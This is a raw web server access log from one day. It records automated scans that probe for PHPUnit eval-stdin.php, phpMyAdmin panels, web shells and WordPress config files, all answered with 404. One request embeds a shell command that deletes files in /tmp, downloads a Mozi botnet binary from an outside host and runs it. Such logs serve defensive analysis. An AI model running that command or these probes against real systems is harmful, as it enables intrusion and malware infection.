36.133.37.6 - - [30/Dec/2020:12:18:09 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/lib/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20"
36.133.37.6 - - [30/Dec/2020:12:18:11 +0000] "GET /incs.php HTTP/1.1" 404 435 "http://SERVER_ADDR/incs.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17"
36.133.37.3 - - [30/Dec/2020:12:18:19 +0000] "GET /plus/read.php HTTP/1.1" 404 435 "http://SERVER_ADDR/plus/read.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18"
36.133.37.6 - - [30/Dec/2020:12:18:26 +0000] "GET /plus/laobiao.php HTTP/1.1" 404 435 "http://SERVER_ADDR/plus/laobiao.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18"
36.133.37.3 - - [30/Dec/2020:12:19:16 +0000] "GET /class1.php HTTP/1.1" 404 435 "http://SERVER_ADDR/class1.php" "Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.7.39 Version/11.00"
36.133.37.6 - - [30/Dec/2020:12:19:21 +0000] "GET /test1.php HTTP/1.1" 404 435 "http://SERVER_ADDR/test1.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0 )"
36.133.37.6 - - [30/Dec/2020:12:19:37 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5"
36.133.37.3 - - [30/Dec/2020:12:20:04 +0000] "GET /wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20100101 Firefox/5.0"
36.133.37.3 - - [30/Dec/2020:12:20:54 +0000] "GET /slider.php HTTP/1.1" 404 435 "http://SERVER_ADDR/slider.php" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0)"
36.133.37.5 - - [30/Dec/2020:12:20:57 +0000] "GET /ww.php HTTP/1.1" 404 435 "http://SERVER_ADDR/ww.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; de-de) AppleWebKit/534.15  (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4"
36.133.37.3 - - [30/Dec/2020:12:21:30 +0000] "GET /mm.php HTTP/1.1" 404 435 "http://SERVER_ADDR/mm.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0.112941"
36.133.37.6 - - [30/Dec/2020:12:21:38 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0"
36.133.37.6 - - [30/Dec/2020:12:22:05 +0000] "GET /autoloader.php HTTP/1.1" 404 435 "http://SERVER_ADDR/autoloader.php" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15"
36.133.37.3 - - [30/Dec/2020:12:22:17 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/lib/phpunit/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2"
36.133.37.5 - - [30/Dec/2020:12:22:34 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Camino/2.2.1"
36.133.37.6 - - [30/Dec/2020:12:22:51 +0000] "GET /phpinf0.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpinf0.php" "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2"
36.133.37.5 - - [30/Dec/2020:12:23:53 +0000] "GET /1ndex.php HTTP/1.1" 404 435 "http://SERVER_ADDR/1ndex.php" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
36.133.37.5 - - [30/Dec/2020:12:23:59 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"
36.133.37.5 - - [30/Dec/2020:12:24:15 +0000] "GET /config.php HTTP/1.1" 404 435 "http://SERVER_ADDR/config.php" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
36.133.37.5 - - [30/Dec/2020:12:24:53 +0000] "GET /1111.php HTTP/1.1" 404 435 "http://SERVER_ADDR/1111.php" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14"
36.133.37.3 - - [30/Dec/2020:12:24:56 +0000] "GET /.git.php HTTP/1.1" 404 435 "http://SERVER_ADDR/.git.php" "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"
36.133.37.6 - - [30/Dec/2020:12:25:26 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php" "Opera/9.25 (Windows NT 6.0; U; en)"
36.133.37.5 - - [30/Dec/2020:12:25:55 +0000] "GET /4o4.php HTTP/1.1" 404 435 "http://SERVER_ADDR/4o4.php" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5"
36.133.37.6 - - [30/Dec/2020:12:26:40 +0000] "GET /fb.php HTTP/1.1" 404 435 "http://SERVER_ADDR/fb.php" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0"
36.133.37.6 - - [30/Dec/2020:12:26:49 +0000] "GET /images/defau1t.php HTTP/1.1" 404 435 "http://SERVER_ADDR/images/defau1t.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.0"
36.133.37.6 - - [30/Dec/2020:12:26:51 +0000] "GET /test123.php HTTP/1.1" 404 435 "http://SERVER_ADDR/test123.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0"
36.133.37.3 - - [30/Dec/2020:12:26:58 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/vendor/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10"
36.133.37.3 - - [30/Dec/2020:12:27:19 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
36.133.37.3 - - [30/Dec/2020:12:27:19 +0000] "GET /fantao.php HTTP/1.1" 404 435 "http://SERVER_ADDR/fantao.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"
36.133.37.5 - - [30/Dec/2020:12:27:31 +0000] "GET /sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )"
36.133.37.6 - - [30/Dec/2020:12:27:41 +0000] "GET /think.php HTTP/1.1" 404 435 "http://SERVER_ADDR/think.php" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7"
36.133.37.6 - - [30/Dec/2020:12:27:50 +0000] "GET /fdgq.php HTTP/1.1" 404 435 "http://SERVER_ADDR/fdgq.php" "Opera/9.5 (Microsoft Windows; PPC; Opera Mobi; U) SonyEricssonX1i/R2AA Profile/MIDP-2.0 Configuration/CLDC-1.1"
36.133.37.3 - - [30/Dec/2020:12:27:52 +0000] "GET /dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Camino/2.2.1"
36.133.37.5 - - [30/Dec/2020:12:28:11 +0000] "GET /dong.php HTTP/1.1" 404 435 "http://SERVER_ADDR/dong.php" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser; Avant Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)"
36.133.37.3 - - [30/Dec/2020:12:28:35 +0000] "GET /queqiao.php HTTP/1.1" 404 435 "http://SERVER_ADDR/queqiao.php" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0)"
36.133.37.3 - - [30/Dec/2020:12:28:51 +0000] "GET /test404.php HTTP/1.1" 404 435 "http://SERVER_ADDR/test404.php" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"
36.133.37.3 - - [30/Dec/2020:12:29:17 +0000] "GET /1q.php HTTP/1.1" 404 435 "http://SERVER_ADDR/1q.php" "Opera/9.25 (Windows NT 6.0; U; en)"
36.133.37.5 - - [30/Dec/2020:12:29:24 +0000] "GET /Config_Shell.php HTTP/1.1" 404 435 "http://SERVER_ADDR/Config_Shell.php" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0) Gecko/16.0 Firefox/16.0"
118.79.146.131 - - [30/Dec/2020:12:29:33 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://118.79.146.131:59797/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 491 "-" "Hello, world"
36.133.37.3 - - [30/Dec/2020:12:29:43 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/lib/phpunit/phpunit/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27"
36.133.37.5 - - [30/Dec/2020:12:29:44 +0000] "GET /indexbak.php HTTP/1.1" 404 435 "http://SERVER_ADDR/indexbak.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; BOLT/2.800) AppleWebKit/534.6 (KHTML, like Gecko) Version/5.0 Safari/534.6.3"
36.133.37.6 - - [30/Dec/2020:12:29:46 +0000] "GET /plus/e7xue.php HTTP/1.1" 404 435 "http://SERVER_ADDR/plus/e7xue.php" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.0)"
36.133.37.5 - - [30/Dec/2020:12:30:20 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpunit/Util/PHP/eval-stdin.php" "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01"
101.32.185.202 - - [30/Dec/2020:12:51:24 +0000] "GET /manager/html/ HTTP/1.0" 404 466 "-" "-"
18.217.126.131 - - [30/Dec/2020:13:05:23 +0000] "GET /manager/html/ HTTP/1.1" 404 454 "-" ""
13.66.139.102 - - [30/Dec/2020:13:09:48 +0000] "GET / HTTP/1.1" 200 3477 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
36.133.37.5 - - [30/Dec/2020:13:13:10 +0000] "GET /phpMyAdmina/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyAdmina/index.php" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"
36.133.37.5 - - [30/Dec/2020:13:13:49 +0000] "GET /phpMyAdmin._2/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyAdmin._2/index.php" "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.6.30 Version/10.61"
36.133.37.5 - - [30/Dec/2020:13:14:44 +0000] "GET /console/login/LoginForm.jsp HTTP/1.1" 404 435 "http://SERVER_ADDR/console/login/LoginForm.jsp" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.15 Safari/534.13"
36.133.37.6 - - [30/Dec/2020:13:14:53 +0000] "GET /wp-includes/css/wp-config.php HTTP/1.1" 404 435 "http://SERVER_ADDR/wp-includes/css/wp-config.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17"
36.133.37.6 - - [30/Dec/2020:13:15:16 +0000] "GET /phpMyAdmin333/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyAdmin333/index.php" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
36.133.37.6 - - [30/Dec/2020:13:15:18 +0000] "GET /pmd/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/pmd/index.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0"
36.133.37.3 - - [30/Dec/2020:13:15:29 +0000] "GET /admin/phpMyAdmin/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/admin/phpMyAdmin/index.php" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Trident/5.0)"
36.133.37.3 - - [30/Dec/2020:13:15:46 +0000] "GET /mysql_admin/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/mysql_admin/index.php" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser; Avant Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)"
36.133.37.6 - - [30/Dec/2020:13:15:53 +0000] "GET /aojiao.php HTTP/1.1" 404 435 "http://SERVER_ADDR/aojiao.php" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
192.95.30.59 - - [30/Dec/2020:13:16:04 +0000] "POST /xmlrpc.php HTTP/1.1" 404 488 "http://www.google.com.hk" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
36.133.37.5 - - [30/Dec/2020:13:17:18 +0000] "GET /phpMyadmi/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyadmi/index.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; BOLT/2.800) AppleWebKit/534.6 (KHTML, like Gecko) Version/5.0 Safari/534.6.3"
36.133.37.5 - - [30/Dec/2020:13:17:33 +0000] "GET /phpMyAdmin_ai/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyAdmin_ai/index.php" "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1"
36.133.37.5 - - [30/Dec/2020:13:18:07 +0000] "GET /pwd/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/pwd/index.php" "Opera/9.51 Beta (Microsoft Windows; PPC; Opera Mobi/1718; U; en)"
36.133.37.5 - - [30/Dec/2020:13:18:21 +0000] "GET /phpMyAdmin/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyAdmin/index.php" "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01"
36.133.37.6 - - [30/Dec/2020:13:18:30 +0000] "GET /plus/shaoyong.php HTTP/1.1" 404 435 "http://SERVER_ADDR/plus/shaoyong.php" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14"
36.133.37.5 - - [30/Dec/2020:13:18:56 +0000] "GET /phpmyadm1n/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpmyadm1n/index.php" "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00"
36.133.37.6 - - [30/Dec/2020:13:19:02 +0000] "GET /phpNyAdmin/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpNyAdmin/index.php" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
36.133.37.3 - - [30/Dec/2020:13:19:24 +0000] "GET /phpMyAdmin4.8.1/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyAdmin4.8.1/index.php" "Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1"
36.133.37.3 - - [30/Dec/2020:13:20:27 +0000] "GET /mysql/admin/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/mysql/admin/index.php" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"
36.133.37.6 - - [30/Dec/2020:13:20:38 +0000] "GET /mysql/mysqlmanager/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/mysql/mysqlmanager/index.php" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
36.133.37.6 - - [30/Dec/2020:13:20:44 +0000] "GET /plus/yunjitan.php HTTP/1.1" 404 435 "http://SERVER_ADDR/plus/yunjitan.php" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1"
36.133.37.5 - - [30/Dec/2020:13:21:09 +0000] "GET /admin/pma/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/admin/pma/index.php" "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"
36.133.37.5 - - [30/Dec/2020:13:21:17 +0000] "GET /websql/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/websql/index.php" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
36.133.37.3 - - [30/Dec/2020:13:21:20 +0000] "GET /phpMyAdminn/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyAdminn/index.php" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)"
36.133.37.5 - - [30/Dec/2020:13:21:20 +0000] "GET /plus/result.php HTTP/1.1" 404 435 "http://SERVER_ADDR/plus/result.php" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
36.133.37.6 - - [30/Dec/2020:13:22:05 +0000] "GET /sql/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/sql/index.php" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre"
36.133.37.6 - - [30/Dec/2020:13:22:31 +0000] "GET /phpMyAdmin4.8.5/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyAdmin4.8.5/index.php" "Opera/9.64 (Macintosh; PPC Mac OS X; U; en) Presto/2.1.1"
36.133.37.6 - - [30/Dec/2020:13:22:58 +0000] "GET /sqladmin/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/sqladmin/index.php" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.2 (KHTML, like Gecko) Safari/125.8"
36.133.37.5 - - [30/Dec/2020:13:23:16 +0000] "GET /myadmin/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/myadmin/index.php" "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0"
36.133.37.6 - - [30/Dec/2020:13:23:29 +0000] "GET /phpMyAdmin4.8.4/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyAdmin4.8.4/index.php" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2"
36.133.37.6 - - [30/Dec/2020:13:24:30 +0000] "GET /mysqladmin/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/mysqladmin/index.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.5; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1"
36.133.37.6 - - [30/Dec/2020:13:24:34 +0000] "GET /ji.php HTTP/1.1" 404 435 "http://SERVER_ADDR/ji.php" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; winfx; .NET CLR 1.1.4322; .NET CLR 2.0.50727; Zune 2.0)"
36.133.37.6 - - [30/Dec/2020:13:24:40 +0000] "GET /phpma/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpma/index.php" "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"
36.133.37.6 - - [30/Dec/2020:13:24:44 +0000] "GET /mysql/sqlmanager/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/mysql/sqlmanager/index.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"
36.133.37.6 - - [30/Dec/2020:13:24:46 +0000] "GET /v/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/v/index.php" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
36.133.37.5 - - [30/Dec/2020:13:32:46 +0000] "GET /phpMyAdmin4.8.2/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyAdmin4.8.2/index.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10"
36.133.37.3 - - [30/Dec/2020:13:32:47 +0000] "GET /phpMyAdminold/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyAdminold/index.php" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.15"
36.133.37.6 - - [30/Dec/2020:13:32:55 +0000] "GET /myadmin2/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/myadmin2/index.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1"
36.133.37.5 - - [30/Dec/2020:13:33:08 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpmyadmin/index.php" "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2"
36.133.37.5 - - [30/Dec/2020:13:33:47 +0000] "GET /phpMyAdmin_111/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyAdmin_111/index.php" "Mozilla/4.0 (compatible; GoogleToolbar 4.0.1019.5266-big; Windows XP 5.1; MSIE 6.0.2900.2180)"
36.133.37.5 - - [30/Dec/2020:13:34:20 +0000] "GET /wp-includes/fonts/wp-config.php HTTP/1.1" 404 435 "http://SERVER_ADDR/wp-includes/fonts/wp-config.php" "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"
36.133.37.6 - - [30/Dec/2020:13:34:33 +0000] "GET /admin/mysql2/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/admin/mysql2/index.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre Camino/2.2a1pre"
36.133.37.6 - - [30/Dec/2020:13:34:37 +0000] "GET /phpMyAdmln/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyAdmln/index.php" "Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre"
36.133.37.5 - - [30/Dec/2020:13:35:21 +0000] "GET /phpMyAdmin__/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyAdmin__/index.php" "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"
36.133.37.5 - - [30/Dec/2020:13:36:16 +0000] "GET /db/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/db/index.php" "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.6.30 Version/10.61"
36.133.37.5 - - [30/Dec/2020:13:36:35 +0000] "GET /claroline/phpMyAdmin/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/claroline/phpMyAdmin/index.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.302.2 Safari/532.8"
36.133.37.6 - - [30/Dec/2020:13:36:36 +0000] "GET /WWW/phpMyAdmin/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/WWW/phpMyAdmin/index.php" "Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00"
36.133.37.6 - - [30/Dec/2020:13:36:52 +0000] "GET /phpMyAdmin+++---/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyAdmin+++---/index.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7"
36.133.37.5 - - [30/Dec/2020:13:37:02 +0000] "GET /phpMydmin/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMydmin/index.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0"
36.133.37.6 - - [30/Dec/2020:13:37:16 +0000] "GET /admin/PMA/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/admin/PMA/index.php" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1"
36.133.37.5 - - [30/Dec/2020:13:37:22 +0000] "GET /phpMyAdmion/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpMyAdmion/index.php" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12"
36.133.37.3 - - [30/Dec/2020:13:37:42 +0000] "GET /wp-includes/modules/modules.php HTTP/1.1" 404 435 "http://SERVER_ADDR/wp-includes/modules/modules.php" "Mozilla/4.0 (compatible; GoogleToolbar 4.0.1019.5266-big; Windows XP 5.1; MSIE 6.0.2900.2180)"
36.133.37.3 - - [30/Dec/2020:13:37:56 +0000] "GET /phpiMyAdmin/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpiMyAdmin/index.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1) Gecko/20090624 Firefox/3.5"
36.133.37.5 - - [30/Dec/2020:13:38:02 +0000] "GET /phpmyadmin/phpmyadmin/index.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpmyadmin/phpmyadmin/index.php" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.8 (KHTML, like Gecko) Beamrise/17.2.0.9 Chrome/17.0.939.0 Safari/535.8"
